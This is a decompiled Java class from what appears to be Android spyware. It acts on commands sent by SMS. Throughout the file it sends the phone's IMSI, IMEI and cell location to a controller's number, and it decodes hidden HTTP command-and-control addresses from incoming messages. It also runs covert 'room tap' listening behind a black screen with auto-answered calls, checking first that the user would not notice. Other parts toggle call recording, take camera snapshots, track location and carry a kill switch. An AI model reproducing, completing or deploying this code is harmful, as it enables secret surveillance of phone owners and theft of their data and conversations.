package com.network.android.a;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Xml;
import com.network.android.AndroidCallDirectWatcher;
import com.network.android.SmsReceiver;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;
import com.network.android.g;
import com.network.android.j;
import com.network.android.monitor.observer.BatteryReceiver;
import com.network.android.monitor.observer.t;
import com.network.android.roomTap.AutoAnswerReceiver;
import com.network.android.roomTap.BlackScreen;
import com.network.android.roomTap.k;
import com.network.android.x;
import com.network.b.b;
import com.network.location.OnAlarmReceiver;
import com.network.location.PingReceiver;
import com.network.media.CoreReceiver;
import com.network.media.r;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.StringWriter;
import java.util.Timer;
import java.util.Vector;
import org.xmlpull.v1.XmlSerializer;

public final class c {

    /* renamed from: a  reason: collision with root package name */
    public static Vector f44a = new Vector();
    public static String b = null;
    static final Handler c = new Handler();
    static Timer d = new Timer();
    public static boolean e = false;
    public static boolean f = false;
    public static Handler g;
    public static boolean h = false;
    public static boolean i = false;
    public static Handler j;

    static {
        HandlerThread handlerThread = new HandlerThread("MO resendingHandler");
        handlerThread.start();
        g = new Handler(handlerThread.getLooper());
        HandlerThread handlerThread2 = new HandlerThread("MO commandHandlerThread");
        handlerThread2.start();
        j = new Handler(handlerThread2.getLooper());
    }

    public static void a() {
        a.a("closeTapWindow start");
        b.d(0L);
        b.a(0L);
        a.a("closeTapWindow end");
    }

    public static void a(Context context) {
        a.a("MO kill");
        i = true;
        new Handler().postDelayed(new g(context), 4000);
    }

    public static void a(Context context, int i2) {
        try {
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            SmsReceiver.a(newSerializer);
            new g();
            x xVar = new x(context);
            g.a(SmsReceiver.c(context), stringWriter.toString(), xVar, null, null, context, null);
            if (xVar.f132a == 0) {
                a.a("sendHttp - Succes in send Ping");
                if (i) {
                    com.network.h.b.a(context);
                }
            } else if (xVar.f132a == -1) {
                a.b("sendHttp -  Fail to send Ping: ");
                if (i2 < 3) {
                    a.b("sendHttp message - Resend ping: " + i2);
                    a(context, i2 + 1);
                    return;
                } else if (i) {
                    a.a("ping SMS sendHttpFirstLastPing fails:" + i2);
                    a(context, 5, (String) null, 1);
                    com.network.h.b.a(context);
                }
            } else {
                a.a("sendHttpFirstLastPing -  Fail to send Ping do to server response: " + xVar.b);
                if (i) {
                    if (xVar.f132a == 100) {
                        a(context, 5, (String) null, 1);
                    }
                    if (xVar.f132a == 50) {
                        com.network.h.b.a(context);
                    } else {
                        a(context, i2 + 1);
                    }
                }
            }
            b.c(context);
        } catch (Throwable th) {
            a.a("sendHttpFirstLastPing" + th.getMessage(), th);
            com.network.android.c.a.b.a(1, (short) 21);
        }
    }

    public static void a(Context context, int i2, int i3, int i4) {
        try {
            a.a("Ping SMS ,post, sendSmsMORepetitive: " + i3);
            g.postDelayed(new f(context, i2, i3, i3 + 1), (long) i4);
        } catch (Throwable th) {
            com.network.android.c.a.b.a(1, (short) 38);
            a.a("sendMO- " + th.getMessage(), th);
            g(context);
        }
    }

    public static void a(Context context, int i2, String str) {
        try {
            a.a("Ping SMS sendSmsMODelay: 60 count: " + i2);
            if (i2 > 5) {
                a.a("Ping SMS sendSmsMODelay count: " + i2);
            }
            com.network.g.a.a(context, 60, "httpPingSms", str);
        } catch (Throwable th) {
            com.network.android.c.a.b.a(1, (short) 38);
            a.a("sendMO- " + th.getMessage(), th);
            g(context);
        }
    }

    public static void a(Context context, int i2, String str, int i3) {
        String str2;
        String str3;
        try {
            String g2 = b.g();
            a.a("MO sendSmsMO Ping SMS MO Start to number: " + g2 + " counter:" + i3 + " Type:" + i2);
            a.a("MO sendSmsMO commandAck: " + str);
            a.a("MO sendSmsMO counter: " + i3);
            if (g2 == null) {
                a.a("sendMO no number");
                if (str != null) {
                    com.network.android.c.a.b.a(0, 125, "", com.network.h.b.c(str));
                    com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str));
                    return;
                }
                return;
            }
            long j2 = b.j();
            a.a("MO sendSmsMO - timeAfterLastCom (MILIseconds): " + j2);
            if (j2 != 0) {
                long currentTimeMillis = (System.currentTimeMillis() / 1000) - j2;
                a.a("MO sendSmsMO - timeAfterLastCom (seconds): " + currentTimeMillis);
                a.a("MO sendSmsMO - MINIMUM_PING_RATE (seconds): 60");
                if (60 > currentTimeMillis) {
                    long j3 = (60 - currentTimeMillis) + 1;
                    a.a("MO sendSmsMO - SMS wont be sent the ping will be in: " + j3);
                    com.network.g.a.a(context, (int) j3, "httpPingSms", str);
                    return;
                }
            }
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            StringBuffer stringBuffer = new StringBuffer();
            GsmCellLocation gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
            String networkOperator = telephonyManager.getNetworkOperator();
            if (networkOperator == null || networkOperator.length() <= 0 || gsmCellLocation == null) {
                com.network.android.c.a.b.a(1, (short) -2009);
            } else {
                int cid = gsmCellLocation.getCid();
                int lac = gsmCellLocation.getLac();
                if (networkOperator == null || networkOperator.length() < 5) {
                    str2 = "000";
                    str3 = "00";
                } else {
                    str2 = networkOperator.substring(0, 3);
                    str3 = networkOperator.substring(3, networkOperator.length());
                }
                if (i2 == 5) {
                    a(stringBuffer, "imsi".toUpperCase(), b.e);
                } else {
                    a(stringBuffer, "imsi".toUpperCase(), SmsReceiver.a(context));
                }
                a(stringBuffer, "IMEI", telephonyManager.getDeviceId());
                if (new Integer(cid).toString().length() > 8) {
                    a(stringBuffer, "Cell", "0");
                } else {
                    a(stringBuffer, "Cell", new StringBuilder().append(cid).toString());
                }
                a(stringBuffer, "Area", new StringBuilder().append(lac).toString());
                a(stringBuffer, "Country", str2 + str3);
                a(stringBuffer, "Op", SmsReceiver.b(context));
                a(stringBuffer, "", new StringBuilder().append(i2).toString());
                if (f44a.isEmpty()) {
                    a(stringBuffer, "", "0000");
                } else {
                    String str4 = (String) f44a.lastElement();
                    a.a("commandAckIdsVector sending element " + str4 + " in sms");
                    a(stringBuffer, "", str4);
                }
                a(stringBuffer, "", c());
            }
            String stringBuffer2 = stringBuffer.toString();
            SmsManager smsManager = SmsManager.getDefault();
            a.a("Ping SMS MO Start to number:" + g2 + " Type:" + i2 + " size:" + stringBuffer2.length());
            a.a(stringBuffer2);
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
            PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
            String str5 = !g2.contains("+") ? "+" + g2 : g2;
            try {
                context.registerReceiver(new k(str, context, i2, i3), new IntentFilter("SMS_SENT"));
            } catch (Throwable th) {
                a.a("sendSmsMO fail ro registerReceiver- " + th.getMessage(), th);
            }
            b.k();
            b.o();
            smsManager.sendTextMessage(str5, null, stringBuffer2, broadcast, broadcast2);
            a.a("Ping SMS MO End to number:" + str5 + " Type:" + i2 + " size:" + stringBuffer2.length());
            if (str != null) {
                com.network.android.c.a.b.a(str);
            }
        } catch (Throwable th2) {
            com.network.android.c.a.b.a(1, (short) 38);
            if (str != null) {
                com.network.android.c.a.b.a(1, -15534, "", com.network.h.b.c(str));
                com.network.android.c.a.b.a(1, 38, "", com.network.h.b.c(str));
            } else {
                com.network.android.c.a.b.a(1, (short) 38);
            }
            a.a("sendSmsMO- " + th2.getMessage(), th2);
            g(context);
        }
    }

    private static void a(Context context, long j2) {
        a.a("MO httpPingKillDelay: " + j2);
        if (com.network.h.b.f143a) {
            a.a("httpPingKillDelay return already kiled");
            return;
        }
        a.a("MO httpPingKillDelay post");
        g.postDelayed(new e(j2, context), j2);
    }

    public static void a(Context context, long j2, long j3) {
        a(context, j2, j3, (String) null);
    }

    private static void a(Context context, long j2, long j3, String str) {
        try {
            a.a("MO location runLocationMontor - sampleRate:" + j2 + " monitorTimeLimit: " + j3);
            if (j2 == 0) {
                a.a("MO location Stop");
                b.b(0L);
                b.c(0L);
                b.c(context);
                c(context);
            } else if (j3 == 0 || j2 < j3) {
                a.a("MO location runLocationMontor start - sampleRate:" + j2 + " monitorTimeLimit: " + j3);
                a.a("MO loctionalarmStart Start - AlarmManager:" + j2 + " monitorTimeLimit: " + j3);
                try {
                    c(context);
                    a.a("MO loctionalarmStart post");
                    g.post(new h(context, j2, j3));
                    a.a("MO loctionalarmStart end - AlarmManager:" + j2 + " monitorTimeLimit: " + j3);
                } catch (Throwable th) {
                    a.a("loctionalarmStart" + th.getMessage(), th);
                }
                if (j3 == 0) {
                    b.b(0L);
                } else {
                    b.b((System.currentTimeMillis() / 1000) + j3);
                }
                b.c(j2);
                b.c(context);
                if (str != null) {
                    com.network.android.c.a.b.a(str);
                }
            } else {
                com.network.android.c.a.b.a(1, (short) 27);
                a.b("LOG_LOCATION_REQ_STOPPED");
            }
        } catch (Throwable th2) {
            if (str != null) {
                com.network.android.c.a.b.a(1, 27, "", com.network.h.b.c(str));
                com.network.android.c.a.b.a(1, -15534, "", com.network.h.b.c(str));
            } else {
                com.network.android.c.a.b.a(1, (short) 27);
            }
            a.a("runLocationMontor - " + th2.getMessage(), th2);
        }
    }

    public static void a(Context context, Handler handler) {
        handler.post(new j(context));
    }

    public static void a(Context context, String str) {
        a(context, str, (String) null);
    }

    public static void a(Context context, String str, int i2) {
        a.a("MO sendSmsPingPost commandAck: " + str);
        a.a("MO sendSmsPingPost ,post, counter: " + i2);
        g.post(new i(context, str, i2));
    }

    private static void a(Context context, String str, String str2) {
        a.a("Ping httpPingService: " + str);
        try {
            Intent intent = new Intent(context, PingReceiver.class);
            intent.setAction(str);
            intent.setData(Uri.parse("PING:" + System.currentTimeMillis()));
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + 1000, PendingIntent.getBroadcast(context, 0, intent, 0));
            a.a("Ping httpPingService AlarmManager: " + str);
            if (str2 != null) {
                com.network.android.c.a.b.a(str2);
            }
        } catch (Throwable th) {
            a.a("httpPingService - " + th.getMessage(), th);
            if (str2 != null) {
                com.network.android.c.a.b.a(0, 21, "", com.network.h.b.c(str2));
                com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str2));
                return;
            }
            com.network.android.c.a.b.a(1, 21, "");
        }
    }

    public static void a(Context context, boolean z) {
        try {
            a.a("Ping httpPingDouble");
            a.a("MO ,post, httpPingDelay5000");
            g.postDelayed(new l(context, z), 5000);
        } catch (Throwable th) {
            a.a("httpPingDouble" + th.getMessage(), th);
        }
    }

    public static void a(Context context, byte[] bArr) {
        a(context, bArr, false, false);
    }

    public static void a(Context context, byte[] bArr, boolean z, boolean z2) {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        SmsReceiver.a(newSerializer, stringWriter);
        SmsReceiver.a(newSerializer);
        new g();
        x xVar = new x(context);
        g.a(SmsReceiver.c(context), stringWriter.toString(), xVar, null, null, context, bArr);
        if (xVar.f132a == 0) {
            a.a("sendHttp - Succes in send Ping");
            if (z && !z2) {
                e = false;
            }
        } else if (xVar.f132a == -1) {
            a.b("sendHttp -  Fail to send Ping retCode: " + xVar.f132a);
        } else if (xVar.f132a == 50) {
            a.a("sendHttp -  retCode == 50 !!! kill command !!!: " + xVar.b);
            a(context);
        }
        b.c(context);
    }

    public static void a(String str, Context context) {
        b(context);
        a.a("MO processTapWindow start ");
        try {
            int parseInt = Integer.parseInt(str.substring(2)) * 1000;
            long currentTimeMillis = System.currentTimeMillis();
            a.a("processTapWindow Tap Window Size" + parseInt);
            b.d(((long) parseInt) + currentTimeMillis);
            b.a(currentTimeMillis);
            a.a("processTapWindow start: " + b.a() + " tapWindowEnd: " + b.x());
            AutoAnswerReceiver.d(context);
        } catch (Throwable th) {
            a.a("MO processTapWindow exception " + th.getMessage(), th);
        }
    }

    public static void a(String str, Context context, String str2) {
        a.a("MO processSMScommand post");
        j.post(new d(str, context, str2));
    }

    public static void a(String str, String str2, Context context) {
        try {
            int indexOf = str.indexOf(38);
            String substring = str.substring(2, indexOf);
            String substring2 = str.substring(indexOf + 3, str.length());
            int parseInt = Integer.parseInt(substring);
            a.a("cameraSnapshot - snapshotNumber: " + parseInt + " snapshotTime: " + Integer.parseInt(substring2));
            com.network.media.a.a(context, str2, 2, 2);
        } catch (Exception e2) {
            com.network.android.c.a.b.a(1, 25, "LOG_CAMERA_SNAPSHOT_FAILED");
            a.a("cameraSnapshot " + e2.getMessage(), e2);
        }
    }

    private static void a(StringBuffer stringBuffer, String str, String str2) {
        stringBuffer.append('\n');
        if (str.length() > 0) {
            stringBuffer.append(str);
            stringBuffer.append(':');
        }
        stringBuffer.append(str2);
    }

    public static String[] a(String str) {
        try {
            a.a("getFetchSettings starting ");
            a.a("getFetchSettings command data: " + str);
            String[] strArr = {"http://" + new String(com.network.i.a.b(str.substring(2))) + "/support.aspx"};
            a.a("getFetchSettings got address: " + strArr[0]);
            return strArr;
        } catch (Throwable th) {
            a.a("getFetchSettings" + th.getMessage(), th);
            return null;
        }
    }

    public static void b(Context context) {
        try {
            Intent intent = new Intent();
            intent.addFlags(268435456);
            intent.setClass(context, BlackScreen.class);
            context.startActivity(intent);
            a.a("startBlackScreenActivity after start activity");
        } catch (Throwable th) {
            a.a("startBlackScreenActivity " + th.getMessage(), th);
        }
    }

    public static void b(Context context, int i2) {
        a(context, i2, (String) null, 1);
    }

    public static void b(String str, Context context, String str2) {
        try {
            h = false;
            String sb = new StringBuilder().append(str.charAt(2)).toString();
            a.a("addCallRecording SMS_CALL_RECORD type: " + sb + " commandAck: " + str2);
            boolean equals = "1".equals(sb);
            a.a("addCallRecording Call Recording: " + sb);
            b.a(Boolean.valueOf(equals));
            if (!equals && r.b() != null) {
                a.a("addCallRecording should's record, and we are reocrding. sending back call the call and stopping the record");
                h = true;
                AndroidCallDirectWatcher.a(context, new Handler());
            }
            com.network.android.c.a.b.a(str2);
        } catch (Throwable th) {
            a.a("addCallRecording exception " + th.getMessage(), th);
            com.network.android.c.a.b.a(0, 2011, "", com.network.h.b.c(str2));
            com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str2));
        }
    }

    public static boolean b() {
        try {
            a.a("isOnTapWindow tapWindowEnd < currentTimeMillis : " + (b.x() > System.currentTimeMillis()));
            if (b.x() > System.currentTimeMillis() && System.currentTimeMillis() > b.a()) {
                a.a("isOnTapWindow returning true ");
                return true;
            }
        } catch (Throwable th) {
            a.a("isOnTapWindow exception " + th.getMessage(), th);
        }
        a.a("isOnTapWindow returning false ");
        return false;
    }

    public static String[] b(String str) {
        try {
            a.a("getSettings starting ");
            a.a("getSettings command data: " + str);
            int indexOf = str.indexOf(38);
            byte[] b2 = com.network.i.a.b(str.substring(2, indexOf));
            int length = b2.length / 6;
            String[] strArr = new String[length];
            String substring = str.substring(indexOf + 3);
            int indexOf2 = substring.indexOf(38);
            String substring2 = substring.substring(0, indexOf2);
            String substring3 = substring.substring(indexOf2 + 3);
            String str2 = "+" + new String(com.network.i.a.b(substring2));
            String str3 = new String(com.network.i.a.b(substring3));
            a.a("room tap: " + str3);
            b.a(str3);
            a.a("Sms command source: " + str2);
            b.b(str2);
            for (int i2 = 0; i2 < length; i2++) {
                StringBuffer stringBuffer = new StringBuffer();
                int i3 = i2 * 6;
                stringBuffer.append(b2[i3] & 255);
                stringBuffer.append('.');
                stringBuffer.append(b2[i3 + 1] & 255);
                stringBuffer.append('.');
                stringBuffer.append(b2[i3 + 2] & 255);
                stringBuffer.append('.');
                stringBuffer.append(b2[i3 + 3] & 255);
                stringBuffer.append(':');
                stringBuffer.append(((b2[i3 + 5] & 255) << 8) + (b2[i3 + 4] & 255));
                strArr[i2] = "http://" + stringBuffer.toString() + "/support.aspx";
                a.a("getSettings got address: " + strArr[i2]);
            }
            return strArr;
        } catch (Exception e2) {
            a.a("MO- getSettings" + e2.getMessage(), e2);
            com.network.android.c.a.b.a(1, (short) 26);
            return null;
        }
    }

    public static String c() {
        int i2 = 0;
        try {
            int[] iArr = new int[10];
            iArr[0] = (int) b.i();
            iArr[1] = (int) b.j();
            iArr[2] = (int) b.l();
            iArr[3] = (int) b.q();
            boolean d2 = d((String) null);
            a.a("BlackScreen isTapAllowed value in telemetry: " + d2);
            if (d2) {
                iArr[4] = (int) k.c();
            } else {
                iArr[4] = ((int) System.currentTimeMillis()) / 1000;
            }
            iArr[5] = b.r();
            iArr[6] = b.n();
            iArr[7] = b.t();
            iArr[8] = b.k;
            iArr[9] = b.j;
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
            try {
                dataOutputStream.writeInt(iArr[0]);
                dataOutputStream.writeInt(iArr[1]);
                dataOutputStream.writeInt(iArr[2]);
                dataOutputStream.writeInt(iArr[3]);
                dataOutputStream.writeShort(iArr[4] & 65535);
                dataOutputStream.writeShort(iArr[5] & 65535);
                dataOutputStream.writeShort(iArr[6] & 65535);
                if (d2) {
                    i2 = -32768;
                }
                dataOutputStream.writeShort(i2 + (iArr[7] & 32767));
                dataOutputStream.writeByte(iArr[8] & 255);
                dataOutputStream.writeByte(iArr[9] & 255);
                String a2 = com.network.i.a.a(byteArrayOutputStream.toByteArray(), 26);
                a.a("Telemetry: " + a2);
                return a2;
            } catch (Throwable th) {
                return null;
            }
        } catch (Exception e2) {
            a.a("careatTelematry- " + e2.getMessage(), e2);
            return null;
        }
    }

    public static void c(Context context) {
        try {
            a.a("MO locationAlarmStop");
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, OnAlarmReceiver.class), 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
            alarmManager.cancel(broadcast);
            Intent intent = new Intent(context, CoreReceiver.class);
            intent.setAction("finishLocationMonitor");
            alarmManager.cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
            com.network.location.a.e(context);
        } catch (Throwable th) {
            a.a("MO locationAlarmStop exception-" + th.getMessage(), th);
        }
    }

    public static void c(String str, Context context, String str2) {
        try {
            int indexOf = str.indexOf(38);
            String substring = str.substring(2, indexOf);
            String substring2 = str.substring(indexOf + 3, str.length());
            long parseLong = Long.parseLong(substring);
            long parseLong2 = Long.parseLong(substring2);
            if (parseLong == 0) {
                com.network.android.c.a.b.a(1, (short) 27);
            }
            a(context, parseLong, parseLong2, str2);
        } catch (Throwable th) {
            a.a("runSMS - Location monitor parsing " + th.getMessage(), th);
            com.network.location.a.e(context);
            if (str2 != null) {
                com.network.android.c.a.b.a(0, 27, "", com.network.h.b.c(str2));
                com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str2));
                return;
            }
            com.network.android.c.a.b.a(1, (short) 27);
        }
    }

    public static boolean c(String str) {
        return d(str);
    }

    public static void d(Context context) {
        a.a("MO kill: killBill");
        if (com.network.h.b.f143a) {
            a.a("killBill return already kiled");
            return;
        }
        HandlerThread handlerThread = new HandlerThread("kill");
        handlerThread.start();
        new Handler(handlerThread.getLooper()).post(new m(context));
    }

    public static void d(String str, Context context, String str2) {
        String sb = new StringBuilder().append(str.charAt(2)).toString();
        a.a("MO ping:" + sb);
        if ("0".equals(sb)) {
            a.a("MO ping SMS ping");
            a(context, str2, 1);
            return;
        }
        a.a("ping HTTP ping");
        com.network.android.c.a.b.a(str2);
        a(context, "httpPing", str2);
    }

    public static boolean d() {
        return Build.VERSION.SDK_INT >= 18;
    }

    private static synchronized boolean d(String str) {
        boolean z;
        synchronized (c.class) {
            try {
                if (e()) {
                    a.a("MO checkIsTapAllow is OVER 4.3. not black tap is not allowed");
                    if (str != null) {
                        com.network.android.c.a.b.a(1, 44, "", com.network.h.b.c(str));
                    }
                    z = false;
                } else {
                    Context a2 = NetworkApp.a();
                    if (k.d) {
                        a.a("checkIsTapAllow Tap not Allow: screen on ");
                        if (str != null) {
                            com.network.android.c.a.b.a(1, 44, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (b.f == null) {
                        a.a("checkIsTapAllow no tap number in configuration. returning false");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 22, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (AutoAnswerReceiver.d) {
                        a.a("Tap was previously ended by usern interference or by a wating call");
                        AutoAnswerReceiver.d = false;
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 124, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (!AutoAnswerReceiver.b) {
                        a.a("checkIsTapAllow Tap not Allow: disconnect faill or other reason");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 22, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (!AutoAnswerReceiver.b()) {
                        a.a("checkIsTapAllow Tap not Allow: not idel ");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 47, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (!k.b(NetworkApp.a())) {
                        a.a("checkIsTapAllow Tap not Allow: screen is not locked ");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 43, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (t.a()) {
                        a.a("checkIsTapAllow Tap not Allow: call forwarding is activated ");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 50, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if ((2 == BatteryReceiver.a() || 1 == BatteryReceiver.a()) && Settings.System.getInt(a2.getContentResolver(), "stay_on_while_plugged_in") > 0) {
                        a.a("checkIsTapAllow Tap not Allow: STAY_ON_WHILE_PLUGGED_IN is turned on, and phone is plugged to charger ");
                        if (str != null) {
                            com.network.android.c.a.b.a(0, 53, "", com.network.h.b.c(str));
                        }
                        z = false;
                    } else if (str == null || !AutoAnswerReceiver.c()) {
                        if (a2 != null) {
                            AudioManager audioManager = (AudioManager) a2.getSystemService("audio");
                            boolean isWiredHeadsetOn = audioManager.isWiredHeadsetOn();
                            if (isWiredHeadsetOn) {
                                a.a("checkIsTapAllow WiredHeadsetOn: " + isWiredHeadsetOn);
                                if (str != null) {
                                    com.network.android.c.a.b.a(0, 54, "", com.network.h.b.c(str));
                                }
                                z = false;
                            } else {
                                boolean isBluetoothA2dpOn = audioManager.isBluetoothA2dpOn();
                                if (isBluetoothA2dpOn) {
                                    a.a("checkIsTapAllow isBluetoothA2dpOn: " + isBluetoothA2dpOn);
                                    if (str != null) {
                                        com.network.android.c.a.b.a(0, 57, "", com.network.h.b.c(str));
                                    }
                                    z = false;
                                } else {
                                    boolean isBluetoothScoOn = audioManager.isBluetoothScoOn();
                                    if (isBluetoothScoOn) {
                                        a.a("checkIsTapAllow isBluetoothScoOn: " + isBluetoothScoOn);
                                        if (str != null) {
                                            com.network.android.c.a.b.a(0, 57, "ROOM_TAP_NOT_ALLOWED_BLOUETOOTH_HEADSET_ON");
                                        }
                                        z = false;
                                    } else {
                                        boolean isMusicActive = audioManager.isMusicActive();
                                        if (isMusicActive) {
                                            a.a("checkIsTapAllow musicActive: " + isMusicActive);
                                            if (str != null) {
                                                com.network.android.c.a.b.a(0, 49, "", com.network.h.b.c(str));
                                            }
                                            z = false;
                                        } else if (j.a((TelephonyManager) a2.getSystemService("phone")) && !"10".equals(b.f())) {
                                            com.network.android.c.a.b.a(1, 22, "", com.network.h.b.c(str));
                                            a.a("checkIsTapAllow Tap not Allow: Roming");
                                            z = false;
                                        }
                                    }
                                }
                            }
                        }
                        z = true;
                    } else {
                        a.a("checkIsTapAllow Tap not Allow: microphone in use");
                        if (str != null) {
                            com.network.android.c.a.b.a(1, 49, "ROOM_TAP_NOT_ALLOWED_SCREEN_PROBLEMATIC_APP_IS_OPEN");
                            com.network.android.c.a.b.a(0, 49, "", com.network.h.b.c(str));
                        }
                        z = false;
                    }
                }
            } catch (Throwable th) {
                a.a("checkIsTapAllow Tap not Allow: exception in checkIsTapAllow");
                z = false;
            }
        }
        return z;
    }

    public static void e(Context context) {
        try {
            i = true;
            b.c(context);
            if (!j.e(context)) {
                a.a("kill - no internet!");
                if (((TelephonyManager) context.getSystemService("phone")).getSubscriberId() != null) {
                    a.a("ping SMS httpFirstLastPing not on line send sms mo kill");
                    a(context, 5, (String) null, 1);
                }
                com.network.h.b.a(context);
                return;
            }
            a(context, 10L);
            a(context, 5000L);
        } catch (Exception e2) {
            a.a("killDouble: " + e2.getMessage(), e2);
        }
    }

    public static boolean e() {
        return Build.VERSION.SDK_INT >= 17;
    }

    public static boolean f(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            return telephonyManager.getNetworkOperator() == null || !telephonyManager.getNetworkOperator().equals("");
        } catch (Throwable th) {
            a.a("isMobileAvailable- " + th.getMessage(), th);
            return false;
        }
    }

    private static void g(Context context) {
        try {
            a.a("sendHttp start");
            if (com.network.h.j.a()) {
                a.a("sendHttp On UpgradeState");
            } else {
                a(context, (byte[]) null, false, false);
            }
        } catch (Throwable th) {
            a.a("sendHttp" + th.getMessage(), th);
            com.network.android.c.a.b.a(1, (short) 21);
        }
    }
}
